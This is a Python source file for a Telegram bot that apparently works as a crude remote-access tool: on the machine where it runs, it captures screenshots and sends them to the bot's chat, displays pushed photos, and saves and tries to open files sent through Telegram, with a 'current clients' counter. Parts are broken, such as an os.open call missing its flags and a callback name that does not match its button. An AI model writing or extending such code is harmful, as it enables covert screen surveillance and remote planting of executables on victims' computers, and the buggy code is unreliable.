import telebot
from PIL import ImageGrab
from PIL import Image
from telebot import types
import os

token = ''
bot = telebot.TeleBot(token)
user_dict = {}
clients = 1

class User:
    def __init__(self, name):
        self.name = name
        self.age = None
        self.sex = None

screenshot_button = types.InlineKeyboardButton(
    "screenshot",
    callback_data="SC_P"
)

picopen_button = types.InlineKeyboardButton(
    "open a photo",
    callback_data="pic_open"
)

exeopen_button = types.InlineKeyboardButton(
    "open a file",
    callback_data="exe_open"
)

keyboard = types.InlineKeyboardMarkup()
keyboard.add(screenshot_button, picopen_button, exeopen_button)

def SC_P(message):
    snapshot = ImageGrab.grab()
    chat_id = message.chat.id
    bot.send_photo(chat_id, snapshot)
    bot.send_message(chat_id, "done!")

def pic_open(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "pls send me a photo.")


@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    file_id = message.photo[-1].file_id
    file_info = bot.get_file(file_id)
    file_data = bot.download_file(file_info.file_path)

    with open("received_photo.jpg", "wb") as f:
        f.write(file_data)
    img = Image.open("received_photo.jpg")
    img.show()

    bot.send_message(chat_id, "done!")

def exe_open(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "pls send me a file.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    file_id = message.document.file_id
    file_name = message.document.file_name

    file_info = bot.get_file(file_id)
    file_data = bot.download_file(file_info.file_path)

    with open(file_name, "wb") as f:
        f.write(file_data)

    os.open(file_name)

    bot.send_message(chat_id, f"done!")
        

@bot.message_handler(commands=['start'])
def send_welcome(message):
    name = message.text
    user = User(name)
    chat_id = message.chat.id
    usnma=message.from_user.first_name
    user_dict[chat_id] = user
    bot.reply_to(message, f"ayo {usnma}, welcome to arizona.")
    bot.send_message(chat_id, f"current clients: {clients}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "SC_P":
        SC_P(call.message)
    elif call.data == "pic_open":
        pic_open(call.message)
    elif call.data == "open_file":
        exe_open(call.message)
bot.infinity_polling()
